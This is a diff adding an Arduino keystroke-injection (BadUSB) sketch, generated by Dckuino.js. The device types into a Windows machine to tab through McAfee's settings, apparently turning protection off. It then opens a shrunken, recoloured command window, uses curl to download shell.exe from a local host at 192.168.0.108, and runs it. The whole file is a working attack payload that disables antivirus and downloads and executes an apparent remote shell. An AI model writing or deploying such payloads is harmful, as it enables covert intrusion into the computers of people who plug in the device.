@@ -1,0 +1,168 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  delay(300);
+
+  Keyboard.print("macafee");
+
+  delay(1000);
+
+  typeKey(KEY_RETURN);
+
+  delay(5000);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  delay(50);
+
+  Keyboard.print("CMD");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.print("mode con: cols=18 lines=1");
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  Keyboard.print("color fe");
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  Keyboard.print("curl http://192.168.0.108/shell.exe --output C://Users//SHAAN//Documents//shell.exe");
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("cd Documents");
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  Keyboard.print("start shell.exe");
+
+  delay(50);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
